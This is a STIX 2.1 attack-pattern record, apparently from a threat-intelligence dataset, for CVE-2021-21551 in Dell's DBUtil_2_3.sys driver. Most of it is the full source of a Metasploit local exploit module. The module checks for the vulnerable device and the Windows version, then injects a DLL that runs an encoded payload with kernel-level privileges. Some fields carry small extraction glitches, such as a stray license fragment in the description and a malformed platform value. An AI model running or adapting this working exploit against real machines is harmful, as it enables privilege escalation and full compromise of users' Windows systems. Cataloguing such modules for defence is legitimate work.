{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--1b12e640-b3cd-4b77-97e4-077175e8e6b2",
    "created": "2024-08-14T16:49:05.405369Z",
    "modified": "2024-08-14T16:49:05.405373Z",
    "name": "Dell DBUtil_2_3.sys IOCTL memmove",
    "description": " The DBUtil_2_3.sys driver distributed by Dell exposes an unprotected IOCTL interface that can be abused by an attacker read and write kernel-mode memory.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/local/cve_2021_21551_dbutil_memmove.rb",
            "external_id": "cve_2021_21551_dbutil_memmove.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2021-21551"
        },
        {
            "source_name": "reference",
            "url": "https://labs.sentinelone.com/cve-2021-21551-hundreds-of-millions-of-dell-computers-at-risk-due-to-multiple-bios-driver-privilege-escalation-flaws/"
        },
        {
            "source_name": "reference",
            "url": "https://www.dell.com/support/kbdoc/ro-ro/000186019/dsa-2021-088-dell-client-platform-security-update-for-dell-driver-insufficient-access-control-vulnerability"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = GoodRanking\n\n  include Msf::Exploit::Local::WindowsKernel\n  include Msf::Post::File\n  include Msf::Post::Windows::Priv\n  include Msf::Post::Windows::Process\n  include Msf::Post::Windows::ReflectiveDLLInjection\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        {\n          'Name' => 'Dell DBUtil_2_3.sys IOCTL memmove',\n          'Description' => %q{\n            The DBUtil_2_3.sys driver distributed by Dell exposes an unprotected IOCTL interface that can be abused by\n            an attacker read and write kernel-mode memory.\n          },\n          'License' => MSF_LICENSE,\n          'Author' => [\n            'Kasif Dekel',     # (from SentinelLabs) blog with detailed analysis\n            'SentinelLabs',    # vulnerability discovery and detailed analysis\n            'Spencer McIntyre' # metasploit module\n          ],\n          'Arch' => [ ARCH_X64 ],\n          'Platform' => 'win',\n          'SessionTypes' => [ 'meterpreter' ],\n          'DefaultOptions' => {\n            'EXITFUNC' => 'thread'\n          },\n          'Targets' => [\n            [ 'Windows x64', { 'Arch' => ARCH_X64 } ]\n          ],\n          'Payload' => {\n            'DisableNops' => true\n          },\n          'References' => [\n            [ 'CVE', '2021-21551' ],\n            [ 'URL', 'https://labs.sentinelone.com/cve-2021-21551-hundreds-of-millions-of-dell-computers-at-risk-due-to-multiple-bios-driver-privilege-escalation-flaws/' ],\n            [ 'URL', 'https://www.dell.com/support/kbdoc/ro-ro/000186019/dsa-2021-088-dell-client-platform-security-update-for-dell-driver-insufficient-access-control-vulnerability' ],\n          ],\n          'DisclosureDate' => '2021-05-04',\n          'DefaultTarget' => 0,\n          'Notes' => {\n            'Stability' => [ CRASH_OS_RESTARTS, ],\n            'Reliability' => [ REPEATABLE_SESSION, ],\n            'SideEffects' => [ IOC_IN_LOGS ]\n          },\n          'Compat' => {\n            'Meterpreter' => {\n              'Commands' => %w[\n                stdapi_railgun_api\n              ]\n            }\n          }\n        }\n      )\n    )\n  end\n\n  def check\n    if session.platform != 'windows'\n      # Non-Windows systems are definitely not affected.\n      return Exploit::CheckCode::Safe\n    end\n\n    handle = open_device('\\\\\\\\.\\\\dbutil_2_3', 'FILE_SHARE_WRITE|FILE_SHARE_READ', 0, 'OPEN_EXISTING')\n    if handle.nil?\n      return Exploit::CheckCode::Safe\n    end\n\n    session.railgun.kernel32.CloseHandle(handle)\n    CheckCode::Appears\n  end\n\n  def target_compatible?\n    version = get_version_info\n\n    vprint_status(\"OS version: #{version}\")\n    return true if version.build_number.between?(Msf::WindowsVersion::Win7_SP0, Msf::WindowsVersion::Win7_SP1) && version.workstation?\n    return true if version.build_number == Msf::WindowsVersion::Win81 && version.workstation?\n    return true if version.build_number.between?(Msf::WindowsVersion::Win10_1607, Msf::WindowsVersion::Win10_21H1)\n\n    false\n  end\n\n  def exploit\n    if is_system?\n      fail_with(Failure::None, 'Session is already elevated')\n    end\n\n    # check that the target is a compatible version of Windows (since the offsets are hardcoded) before loading the RDLL\n    unless target_compatible?\n      fail_with(Failure::NoTarget, 'The exploit does not support this target')\n    end\n\n    if sysinfo['Architecture'] == ARCH_X64 && session.arch == ARCH_X86\n      fail_with(Failure::NoTarget, 'Running against WOW64 is not supported')\n    elsif sysinfo['Architecture'] == ARCH_X64 && target.arch.first == ARCH_X86\n      fail_with(Failure::NoTarget, 'Session host is x64, but the target is specified as x86')\n    elsif sysinfo['Architecture'] == ARCH_X86 && target.arch.first == ARCH_X64\n      fail_with(Failure::NoTarget, 'Session host is x86, but the target is specified as x64')\n    end\n\n    encoded_payload = payload.encoded\n    execute_dll(\n      ::File.join(Msf::Config.data_directory, 'exploits', 'CVE-2021-21551', 'CVE-2021-21551.x64.dll'),\n      [encoded_payload.length].pack('I<') + encoded_payload\n    )\n\n    print_good('Exploit finished, wait for (hopefully privileged) payload execution to complete.')\n  end\nend\n",
    "x_mitre_disclosure_date": "2021-05-04",
    "x_mitre_platforms": [
        "win'"
    ]
}